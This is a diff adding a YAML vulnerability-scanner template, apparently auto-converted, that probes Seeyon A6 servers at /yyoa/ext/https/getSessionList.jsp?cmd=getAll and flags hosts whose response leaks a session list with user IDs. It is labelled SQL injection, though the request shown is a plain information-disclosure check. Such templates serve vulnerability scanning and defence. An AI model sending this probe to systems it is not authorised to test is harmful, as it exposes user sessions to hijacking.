@@ -1,0 +1,21 @@
+id: yaml-poc-seeyon-seeyon_a6-sql_injection-CT-158518
+info:
+  name: Yaml Poc Seeyon Seeyon_A6 Sql_Injection Ct 158518
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_a6-sql_injection-CT-158518'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <SessionList>\r\n<Session>\r\n<usrID>
